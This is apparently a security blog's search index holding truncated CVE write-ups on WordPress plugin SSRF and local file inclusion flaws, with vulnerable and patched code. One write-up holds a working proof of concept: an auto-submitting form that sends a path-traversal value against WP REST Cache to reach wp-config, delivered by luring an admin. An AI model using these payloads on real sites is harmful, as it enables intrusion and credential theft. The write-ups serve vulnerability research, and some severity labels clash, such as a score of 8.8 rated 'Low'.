support a method for supplying an array of strings to the CGI script. This is only used in the case of an 'indexed' HTTP query, which is identified by a 'GET' or 'HEAD' request with a URI query string that does not contain any unencoded \"=\" characters. For such a request, the server SHOULD treat the query-string as a search-string and parse it into words, using the rules search-string = search-word ( \"+\" search-word ) search-word = 1*schar schar = unreserved | escaped | ","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:0:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Essential Blocks for Gutenberg Plugin.","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The Gutenberg Essential Blocks ‚Äì Page Builder for Gutenberg Blocks \u0026 Patterns plugin for WordPress is vulnerable to Server-Side Request Forgery (SSRF) in all versions up to and including 5.7.1, via the function eb_save_ai_generated_image. This allows an authenticated attacker with Author-level privileges or higher to perform web requests to arbitrary addresses from the web application, and can be abused to query and exfiltrate information from internal services. CVE ID: CVE-2025-11361 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.7.1 Patched Versions: 5.7.2 CVSS severity: Low (5.5) Required Privilege: Author Product: WordPress Essential Blocks for Gutenberg Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Essential Blocks for Gutenberg: 5.7.1 (vulnerable) and 5.7.2 (patched). Diff tool - Meld or any diff/comparison tool to inspect differences between the two versions. Analysis Patch diff Vulnerable code: public function eb_save_ai_generated_image() { if ( ! isset( $_POST[ 'admin_nonce' ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ 'admin_nonce' ] ), 'admin-nonce' ) ) { wp_send_json_error( __( 'Nonce Error', 'essential-blocks' ) ); } if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( __( 'You are not authorized to upload files!', 'essential-blocks' ) ); } // Check if we have either image_url or image_b64 along with prompt if ( ( isset( $_POST[ 'image_url' ] ) || isset( $_POST[ 'image_b64' ] ) ) \u0026\u0026 isset( $_POST[ 'prompt' ] ) ) { $image_url = isset( $_POST[ 'image_url' ] ) ? esc_url_raw( $_POST[ 'image_url' ] ) : null; $image_body = ''; // Handle URL format if ( $image_url ) { // Download the image from OpenAI URL $image_data = wp_remote_get( $image_url, [ 'timeout' =\u003e 60 ] ); if ( is_wp_error( $image_data ) ) { wp_send_json_error( [ 'message' =\u003e __( 'Failed to download image from OpenAI.', 'essential-blocks' ) ] ); return; } // Detect image format and set appropriate extension and MIME type $image_info = getimagesizefromstring( $image_body ); $mime_type = $image_info ? $image_info[ 'mime' ] : 'image/png'; // Determine file extension based on MIME type $extension = 'png'; // default switch ( $mime_type ) { case 'image/jpeg': $extension = 'jpg'; break; case 'image/png': $extension = 'png'; break; case 'image/webp': $extension = 'webp'; break; case 'image/gif': $extension = 'gif'; break; } $image_body = wp_remote_retrieve_body( $image_data ); } // other logic } else { wp_send_json_error( __( 'Image data (URL or base64) and prompt are required', 'essential-blocks' ) ); } } In the vulnerable version, the code uses wp_remote_get($image_url) to download an image without validating or restricting the source URL. It does not check the HTTP response code, the MIME type, or the actual content of the returned file, allowing an attacker to abuse this to perform SSRF to internal services or to download malicious content disguised as an image. Patched code: public function eb_save_ai_generated_image() { if ( ! isset( $_POST[ 'admin_nonce' ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ 'admin_nonce' ] ), 'admin-nonce' ) ) { wp_send_json_error( __( 'Nonce Error', 'essential-blocks' ) ); } if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( __( 'You are not authorized to upload files!', 'essential-blocks' ) ); } // Check if we have either image_url or image_b64 along with prompt if ( ( isset( $_POST[ 'image_url' ] ) || isset( $_POST[ 'image_b64' ] ) ) \u0026\u0026 isset( $_POST[ 'prompt' ] ) ) { $image_url = isset( $_POST[ 'image_url' ] ) ? esc_url_raw( $_POST[ 'image_url' ] ) : null; $image_body = ''; // Handle URL format if ( $image_url ) { // Download the image from validated URL $image_data = wp_safe_remote_get( $image_url, [ 'timeout' =\u003e 30, 'redirection' =\u003e 3, 'user-agent' =\u003e 'Essential Blocks/' . ESSENTIAL_BLOCKS_VERSION, 'headers' =\u003e [ 'Accept' =\u003e 'image/*' ] ] ); if ( is_wp_error( $image_data ) ) { wp_send_json_error(","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/"},{"categories":["Web"],"content":"A powerful and the most popular content management system (CMS).","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/"},{"categories":["Web"],"content":"Continuing from the previous guide on installing WordPress in a local environment (see here), this post will show you how to set up WordPress with Docker ‚Äî a modern, flexible, and easily shareable approach. Why Use Docker? Docker allows you to package the entire WordPress environment (PHP, MySQL, web server, and source code) into independent containers. This brings several key advantages: Environment consistency: Works the same everywhere, eliminating ‚Äúworks on my machine‚Äù issues. Easy setup and reset: Spin up or rebuild your environment in just a few commands. Isolation and security: Each container runs independently, avoiding software conflicts. Convenient development and debugging: Enable Xdebug, monitor logs, or tweak PHP settings without affecting your main system. Easy sharing: Just share the docker-compose.yml file ‚Äî others can launch the exact same setup without manual installation. Docker is an optimal solution for developing, testing, and collaborating on WordPress projects ‚Äî especially useful for developers, teams, or penetration testers who need a consistent, reproducible environment. Setup WordPress for Hacker in Docker Prerequisites Docker First, install Docker. It‚Äôs available on all major operating systems, with installation steps differing slightly per platform. See the official guide: https://www.docker.com/get-started/ Docker Compose Instead of manually starting containers with docker run, use Docker Compose ‚Äî a tool that defines and manages multiple linked containers using a single configuration file (docker-compose.yml). For WordPress, you‚Äôll need: A MySQL container for the database. A WordPress (PHP + web server) container for the site itself. Manually setting this up involves complex commands and configurations. With Docker Compose, everything is neatly handled in one YAML file: Easy setup: Run docker-compose up -d to get WordPress + MySQL instantly. Easy sharing: Anyone can use your docker-compose.yml to replicate your setup. Easy expansion: Add phpMyAdmin, Nginx, or Xdebug with just a few extra lines. Install instructions: https://docs.docker.com/compose/install/ Installing WordPress with Docker Compose and Xdebug This section shows how to install WordPress using Docker Compose, with Xdebug integration for debugging directly in VS Code. This gives you a complete development setup that‚Äôs easy to debug and extend. Folder structure: . ‚îú‚îÄ‚îÄ wordpress ‚îú‚îÄ‚îÄ docker-compose.yml ‚îú‚îÄ‚îÄ Dockerfile ‚îú‚îÄ‚îÄ php.ini ‚îî‚îÄ‚îÄ .vscode ‚îî‚îÄ‚îÄ launch.json Setup Environment Create a new folder to store all configuration files: mkdir wordpress-docker \u0026\u0026 cd wordpress-docker Create Dockerfile The default WordPress image does not include Xdebug, so we‚Äôll extend it with a Dockerfile. nano Dockerfile Content: FROM wordpress:latest # Install Xdebug RUN pecl install xdebug \u0026\u0026 docker-php-ext-enable xdebug Create docker-compose.yml Now create the file that configures the full environment: nano docker-compose.yml Content: services: db: image: mysql:latest container_name: wp_db restart: always environment: MYSQL_ROOT_PASSWORD: root MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress volumes: - db_data:/var/lib/mysql wordpress: build: . container_name: wp_app depends_on: - db ports: - \"80:80\" restart: always environment: WORDPRESS_DB_HOST: db:3306 WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress WORDPRESS_DB_NAME: wordpress volumes: - ./wordpress:/var/www/html - ./php.ini:/usr/local/etc/php/conf.d/php.ini volumes: db_data: Info The volumes: section handles data persistence and source code synchronization between your host machine and containers. Explanation: db_data:/var/lib/mysql Stores MySQL data persistently ‚Äî your database won‚Äôt be lost if the container is removed. ./wordpress:/var/www/html Syncs WordPress source code between your machine and the container, allowing live editing. ./php.ini:/usr/local/etc/php/conf.d/php.ini Mounts your PHP/Xdebug config file for easy customization without rebuilding the image. Cr","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:0:0","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress MasterStudy LMS Plugin.","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The MasterStudy LMS plugin version ‚â§ 3.5.28 contains a Local File Inclusion (LFI) vulnerability that allows an unauthenticated attacker to control the file parameter in the include/require statement, enabling the inclusion or reading of local files on the server (e.g., configuration files containing credentials). This can lead to sensitive information disclosure and, in certain configurations, remote code execution. CVE ID: CVE-2025-32141 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 3.5.28 Patched Versions: 3.5.29 CVSS severity: Low (8.8) Required Privilege: Contributor Product: WordPress MasterStudy LMS Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - MasterStudy LMS: 3.5.28 (vulnerable) and 3.5.29 (patched). Diff tool - Meld or any diff tool to compare the two versions. Analysis Patch diff Vulnerable Version: \u003c?php add_shortcode( 'stm_lms_courses_categories', 'stm_lms_courses_categories_shortcode' ); function stm_lms_courses_categories_shortcode( $atts ) { $atts = shortcode_atts( array( 'taxonomy' =\u003e '', 'style' =\u003e 'style_1', ), $atts ); ob_start(); STM_LMS_Templates::stm_lms_load_vc_element( 'courses_categories', $atts, $atts['style'] ); return ob_get_clean(); } In the vulnerable version, the shortcode callback stm_lms_courses_categories directly passes the style value from $atts into STM_LMS_Templates::stm_lms_load_vc_element() without sanitization or validation ‚Äî leading to a potential LFI. Patched Version: \u003c?php add_shortcode( 'stm_lms_courses_categories', 'stm_lms_courses_categories_shortcode' ); function stm_lms_courses_categories_shortcode( $atts, $content = null, $tag = '' ) { $atts = shortcode_atts( array( 'taxonomy' =\u003e '', 'style' =\u003e 'style_1', ), $atts, $tag ); $atts['style'] = basename( sanitize_file_name( $atts['style'] ) ); ob_start(); STM_LMS_Templates::stm_lms_load_vc_element( 'courses_categories', $atts, $atts['style'] ); return ob_get_clean(); } The patch sanitizes $atts['style'] using sanitize_file_name(), removing unsafe characters and preventing LFI. Vulnerable Code public static function stm_lms_load_vc_element( $__template, $__vars = array(), $__template_name = '', $custom_path = '' ) { extract( $__vars ); // phpcs:ignore WordPress.PHP.DontExtract $element = self::stm_lms_locate_vc_element( $__template, $__template_name, $custom_path ); if ( ! file_exists( $element ) \u0026\u0026 strpos( $__template_name, 'style_' ) !== false ) { $element = str_replace( $__template_name, 'style_1', $element ); } if ( file_exists( $element ) ) { include $element; } else { echo esc_html__( 'Element not found in', 'masterstudy-lms-learning-management-system' ); echo esc_html( ' ' . $element ); } } The include() statement uses $element returned from stm_lms_locate_vc_element(), which is influenced by $__template_name (the style parameter from the shortcode). Without validation, an attacker can manipulate it to include arbitrary files, leading to LFI. public static function stm_lms_locate_vc_element( $templates, $template_name = '', $custom_path = '' ) { $located = false; foreach ( (array) $templates as $template ) { $folder = $template; if ( ! empty( $template_name ) ) { $template = $template_name; } if ( substr( $template, -4 ) !== '.php' ) { $template .= '.php'; } if ( empty( $custom_path ) ) { $located = locate_template( 'partials/vc_parts/' . $folder . '/' . $template ); if ( ! ( $located ) ) { $located = STM_LMS_PATH . '/includes/shortcodes/partials/' . $folder . '/' . $template; } } else { $located = locate_template( $custom_path ); if ( ! ( $located ) ) { $located = STM_LMS_PATH . '/' . $custom_path . '.php'; } } if ( file_exists( $template_name ) ) { break; } } return apply_filters( 'stm_lms_locate_vc_element', $located, $templates ); } The stm_lms_locate_vc_element() function determines and returns the path of the template file (.php). If $template_name is provided, it overrides the default template name and ensures it ends with .php. The re","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress WP REST Cache Plugin.","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The WP REST Cache plugin version ‚â§ 2025.1.0 contains a Local File Inclusion vulnerability that allows an unauthenticated attacker to control the file parameter used in include/require, thereby injecting or reading local files on the server (e.g., configuration files containing credentials), leading to leakage of sensitive information and, in some configurations, possible code execution. CVE ID: CVE-2025-52716 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 2025.1.0 Patched Versions: 2025.1.1 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress WP REST Cache Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - WP REST Cache: 2025.1.0 (vulnerable) and 2025.1.1 (patched). Diff tool - Meld or any diff/comparison tool to inspect differences between the two versions. Analysis Patch diff Vulnerable version: public function settings_page() { $this-\u003esettings_panels = apply_filters( 'wp_rest_cache/settings_panels', $this-\u003esettings_panels ); $sub = filter_input( INPUT_GET, 'sub', FILTER_SANITIZE_FULL_SPECIAL_CHARS ); if ( empty( $sub ) ) { $sub = 'settings'; } include_once __DIR__ . '/partials/header.php'; if ( isset( $this-\u003esettings_panels[ $sub ]['template'] ) ) { include_once $this-\u003esettings_panels[ $sub ]['template']; } elseif ( file_exists( __DIR__ . '/partials/sub-' . $sub . '.php' ) ) { include_once __DIR__ . '/partials/sub-' . $sub . '.php'; } else { include_once __DIR__ . '/partials/sub-settings.php'; } } In the vulnerable version, $sub is the value returned by filter_input() taken from the GET parameter (?sub=...) in the URL using the filter FILTER_SANITIZE_FULL_SPECIAL_CHARS, which escapes \"\u003c\u003e\u0026 and characters with ASCII values below 32. This filter does not remove . (46) or / (47). $sub is concatenated into a string with the '.php' suffix and then include_onced without any protection against LFI. Patch: public function settings_page() { $this-\u003esettings_panels = apply_filters( 'wp_rest_cache/settings_panels', $this-\u003esettings_panels ); $sub = filter_input( INPUT_GET, 'sub', FILTER_SANITIZE_FULL_SPECIAL_CHARS ); if ( empty( $sub ) ) { $sub = 'settings'; } $potential_sub_file = __DIR__ . '/partials/sub-' . $sub . '.php'; if ( dirname( $potential_sub_file ) !== __DIR__ . '/partials' ) { $sub = 'settings'; } include_once __DIR__ . '/partials/header.php'; if ( isset( $this-\u003esettings_panels[ $sub ]['template'] ) ) { include_once $this-\u003esettings_panels[ $sub ]['template']; } elseif ( file_exists( __DIR__ . '/partials/sub-' . $sub . '.php' ) ) { include_once __DIR__ . '/partials/sub-' . $sub . '.php'; } else { include_once __DIR__ . '/partials/sub-settings.php'; } } The patch adds a check on the file location before include, ensuring the file to be loaded is located within the partials directory. If a path outside that directory is detected (e.g., due to ../), the plugin falls back to a safe default file. This eliminates the LFI vulnerability. Vulnerable Code settings_page() is registered as the submenu callback: add_submenu_page( 'options-general.php', 'WP REST Cache', 'WP REST Cache', $capability, 'wp-rest-cache', [ $this, 'settings_page', ] ); So when the endpoint GET /wp-admin/options-general.php?page=wp-rest-cache HTTP/1.1 is accessed, settings_page() is invoked. Exploit Proof of Concept (PoC) Step 1 Create a web page with a form that automatically sends a request with the LFI payload \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform action=\"http://localhost:80//wp-admin/options-general.php\" method=\"get\"\u003e \u003cinput type=\"text\" name=\"page\" value=\"wp-rest-cache\"\u003e \u003cinput type=\"text\" name=\"sub\" value=\"/../../../../../../wp-cofnig\"\u003e \u003c/form\u003e \u003cscript\u003e document.forms[0].submit() \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Step 2 Send the link to an admin or a privileged user Warning This vulnerability can only be exploited on Wind","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress LatePoint Plugin.","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin LatePoint version ‚â§ 5.1.93 contains a Local File Inclusion vulnerability that allows unauthenticated attackers to control the file parameter in the include/require statement, thereby injecting or reading local files on the server (e.g., configuration files containing credentials), leading to sensitive information disclosure and, in some configurations, potential code execution. CVE ID: CVE-2025-6715 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 5.1.93 Patched Versions: 5.1.94 CVSS severity: High (8.1) Required Privilege: Unauthenticated Product: WordPress LatePoint Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - LatePoint: 5.1.93 (vulnerable) and 5.1.94 (patched). Diff tool - Meld or any diff tool to compare and inspect differences between versions. Analysis Patch diff Vulnerable version: function render($view, $layout = 'none', $extra_vars = array()){ $this-\u003evars['route_name'] = $this-\u003eroute_name; extract($extra_vars); extract($this-\u003evars); ob_start(); if($layout != 'none'){ // rendering layout, view variable will be passed and used in layout file include LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $this-\u003eadd_extension($layout, '.php'); }else{ include $this-\u003eadd_extension($view, '.php'); } $response_html = ob_get_clean(); return $response_html; } In the vulnerable version, the render() function appends .php to $layout and directly includes it without validation, leading to Local File Inclusion (LFI) if $layout is controlled by user input. Patched version: function render($view, $layout = 'none', $extra_vars = array()){ $this-\u003evars['route_name'] = $this-\u003eroute_name; extract($extra_vars); extract($this-\u003evars); ob_start(); if($layout != 'none'){ $layout_path = $this-\u003eget_safe_layout_path($layout); // rendering layout, view variable will be passed and used in layout file if($layout_path){ include $layout_path; }else{ __('Invalid layout', 'latepoint'); } }else{ include $this-\u003eadd_extension($view, '.php'); } $response_html = ob_get_clean(); return $response_html; } private function get_safe_layout_path($layout) { // 1. Remove any path separators and null bytes $layout = str_replace(['/', '\\\\', \"\\0\"], '', $layout); // 2. Remove any dots to prevent directory traversal $layout = str_replace('.', '', $layout); // 3. Only allow alphanumeric, underscore, and hyphen $layout = preg_replace('/[^a-zA-Z0-9_-]/', '', $layout); // 4. Construct the full path $layout_file = $this-\u003eadd_extension($layout, '.php'); $full_path = LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $layout_file; // 5. Use realpath to resolve any remaining traversal attempts $real_path = realpath($full_path); $base_path = realpath(LATEPOINT_VIEWS_LAYOUTS_ABSPATH); // 6. Ensure the resolved path is within the layouts directory if ($real_path \u0026\u0026 $base_path \u0026\u0026 strpos($real_path, $base_path) === 0) { return $real_path; } return false; } The patch adds get_safe_layout_path() to remove /, \\, ., and null bytes; only allow [A-Za-z0-9_-]; construct the path, use realpath() and compare it with LATEPOINT_VIEWS_LAYOUTS_ABSPATH. The file is included only if valid, preventing LFI. Vulnerable Code The render() function is called in 12 different locations, so manual tracing would be time-consuming. 12 call locations of render() To optimize, use a debugger: Set a breakpoint inside render(). Perform various actions through the UI. Each time render() is called, execution pauses at the breakpoint and highlights the corresponding code line, allowing quick identification of call flows. Debugger jumps to breakpoint üëâ When accessing the endpoint http://localhost/wp-admin/admin.php?page=latepoint\u0026route_name=calendars__view with route names as plugin submenus, render() is invoked with the default layout admin. Default layout Examining the callstack reveals the call flow leading to render(). Callstack flow function format_render_return($view_name, $extra_vars = array(), $json_return_vars = array(), $from_shared_folder = false){ $html ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Hide My WP Ghost Plugin.","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The Hide My WP Ghost plugin version ‚â§ 5.4.01 contains a Local File Inclusion vulnerability that allows an unauthenticated attacker to control the file parameter used in include/require, thereby injecting or reading local files on the server (for example configuration files containing credentials), leading to sensitive information disclosure and, in some configurations, possible code execution. CVE ID: CVE-2025-26909 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 5.4.01 Patched Versions: 5.4.02 CVSS severity: High (9.6) Required Privilege: Unauthenticated Product: WordPress Hide My WP Ghost Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Hide My WP Ghost: 5.3.02 (vulnerable) and 5.4.02 (patched). Diff tool - Meld or any diff/comparison tool to check and compare differences between the two versions. Analysis Patch diff Vulnerable version: public function getOriginalUrl( $url ) { // Build the rewrite rules if they are not already built if ( empty( $this-\u003e_rewrites ) ) { $this-\u003ebuildRedirect(); } // Parse the URL components $parse_url = wp_parse_url( $url ); // Get the home root path $path = wp_parse_url( home_url(), PHP_URL_PATH ); // Backslash the paths if ( $path \u003c\u003e '' ) { $parse_url['path'] = preg_replace( '/^' . preg_quote( $path, '/' ) . '/', '', $parse_url['path'] ); } // Replace paths to original based on rewrite rules if ( isset( $this-\u003e_rewrites['from'] ) \u0026\u0026 isset( $this-\u003e_rewrites['to'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['from'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['to'] ) ) { $parse_url['path'] = preg_replace( $this-\u003e_rewrites['from'], $this-\u003e_rewrites['to'], $parse_url['path'], 1 ); } // Default to https if the scheme is not set if ( ! isset( $parse_url['scheme'] ) ) { $parse_url['scheme'] = 'https'; } // Reconstruct the URL if ( isset( $parse_url['port'] ) \u0026\u0026 $parse_url['port'] \u003c\u003e 80 ) { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . ':' . $parse_url['port'] . $path . $parse_url['path']; } else { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . $path . $parse_url['path']; } // Append query string if present if ( isset( $parse_url['query'] ) \u0026\u0026 ! empty( $parse_url['query'] ) ) { $query = $parse_url['query']; $query = str_replace( array( '?', '%3F' ), '\u0026', $query ); $new_url .= ( ! strpos( $new_url, '?' ) ? '?' : '\u0026' ) . $query; } // Return the constructed URL return $new_url; } The getOriginalUrl() function is used to parse and reconstruct the original URL based on the system‚Äôs rewrite rules. In the vulnerable version, the value of $new_url is not sanitized before being returned, allowing an attacker to inject malicious path components like ../../etc/passwd, leading to LFI risk. Patched version: public function getOriginalUrl( $url ) { // Build the rewrite rules if they are not already built if ( empty( $this-\u003e_rewrites ) ) { $this-\u003ebuildRedirect(); } // Parse the URL components $parse_url = wp_parse_url( $url ); // Only if there is a path to change if( !isset( $parse_url['path'] ) ) { return $url; } // Get the home root path $path = wp_parse_url( home_url(), PHP_URL_PATH ); // Backslash the paths if ( $path \u003c\u003e '' ) { $parse_url['path'] = preg_replace( '/^' . preg_quote( $path, '/' ) . '/', '', $parse_url['path'] ); } // Replace paths to original based on rewrite rules if ( isset( $this-\u003e_rewrites['from'] ) \u0026\u0026 isset( $this-\u003e_rewrites['to'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['from'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['to'] ) ) { $parse_url['path'] = preg_replace( $this-\u003e_rewrites['from'], $this-\u003e_rewrites['to'], $parse_url['path'], 1 ); } // Default to https if the scheme is not set if ( ! isset( $parse_url['scheme'] ) ) { $parse_url['scheme'] = 'https'; } // Reconstruct the URL if ( isset( $parse_url['port'] ) \u0026\u0026 $parse_url['port'] \u003c\u003e 80 ) { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . ':' . $parse_url['port'] . $path . $parse_url['path']; } else { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress License For Envato Plugin.","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The License For Envato plugin version ‚â§ 1.0.0 contains a Local File Inclusion vulnerability that allows an attacker to control the file parameter used in include/require without authentication, thereby including or reading local files on the server (e.g., configuration files containing credentials), leading to sensitive information disclosure and, in some configurations, potential code execution. CVE ID: CVE-2025-39399 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.0.0 Patched Versions: 1.1.0 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress License For Envato Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - License For Envato: 1.0.0 (vulnerable) and 1.1.0 (patched). Diff tool - Meld or any diff/compare tool to inspect differences between the two versions. Analysis Patch diff Vulnerable version: \u003cdiv class=\"wrap\"\u003e \u003c?php $action = isset( $_GET['tab'] ) ? sanitize_text_field( $_GET['tab'] ) : 'general'; ?\u003e // other logic \u003c?php $dir = __DIR__; $licenseEnvato_nav_view = apply_filters( 'license_envato_settings_view', $dir, $action ); if ($licenseEnvato_nav_view) { $template = \"{$licenseEnvato_nav_view}/{$action}.php\"; } if ( file_exists( $template ) ) { include $template; }else{ include \"{$licenseEnvato_nav_view}/general.php\"; } ?\u003e \u003c/div\u003e In the vulnerable version, the value of $action is taken directly from $_GET['tab']. Although this value is passed through sanitize_text_field(), that function only strips HTML tags ‚Äî it does not prevent path traversal sequences like ../. Therefore, an attacker can supply a value such as ?tab=../../somefile, causing $action to contain an unexpected path. When this value is concatenated into $template and then included =\u003e LFI occurs. Patched version: \u003c?php // Exit if accessed directly defined('ABSPATH') || exit; // Define allowed tab values to prevent LFI $allowed_tabs = array('general', 'envato'); // Apply filter to allow extensions to add their own tabs $allowed_tabs = apply_filters('license_envato_allowed_tabs', $allowed_tabs); // Verify nonce if tab parameter is set $action = 'general'; if (isset($_GET['tab'])) { // Verify nonce for tab switching if provided if (isset($_GET['_wpnonce']) \u0026\u0026 wp_verify_nonce(sanitize_text_field(wp_unslash($_GET['_wpnonce'])), 'license_envato_switch_tab')) { $tab = sanitize_text_field(wp_unslash($_GET['tab'])); // Only allow values from the whitelist $action = in_array($tab, $allowed_tabs) ? $tab : 'general'; } elseif (!isset($_GET['_wpnonce'])) { // If no nonce is provided, still allow tab switching but sanitize input $tab = sanitize_text_field(wp_unslash($_GET['tab'])); // Only allow values from the whitelist $action = in_array($tab, $allowed_tabs) ? $tab : 'general'; } } ?\u003e \u003cdiv class=\"wrap\"\u003e \u003c?php $dir = __DIR__; $licenseEnvato_nav_view = apply_filters( 'license_envato_settings_view', $dir, $action ); if ($licenseEnvato_nav_view) { // Ensure we only include files within the plugin directory structure $template = realpath(\"{$licenseEnvato_nav_view}/{$action}.php\"); $nav_view_dir = realpath($licenseEnvato_nav_view); // Verify the template is a child of the nav view directory to prevent path traversal if ($template \u0026\u0026 $nav_view_dir \u0026\u0026 strpos($template, $nav_view_dir) === 0 \u0026\u0026 file_exists($template)) { include $template; } else { // Fallback to general.php with the same security checks $general_template = realpath(\"{$licenseEnvato_nav_view}/general.php\"); if ($general_template \u0026\u0026 strpos($general_template, $nav_view_dir) === 0) { include $general_template; } } } ?\u003e \u003c/div\u003e The patch implements multiple measures to mitigate LFI and harden the handling of the tab parameter: Use a whitelist $allowed_tabs $allowed_tabs = array('general', 'envato'); $allowed_tabs = apply_filters('license_envato_allowed_tabs', $allowed_tabs); Verify nonce to prevent CSRF if (isset($_GET['_wpnonce']) \u0026\u0026 wp_verify_nonce(..., 'license_envato_switch_tab')) The reason the CVE is la","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Subscribe to Download Lite Plugin.","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The Subscribe to Download Lite plugin version ‚â§ 1.2.9 contains a Local File Inclusion vulnerability that allows an unauthenticated attacker to control the file parameter used in include/require, thereby including or reading local files on the server (for example configuration files that contain credentials), leading to sensitive information disclosure and, in some configurations, possible code execution. CVE ID: CVE-2025-30782 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.2.9 Patched Versions: 1.3.0 CVSS 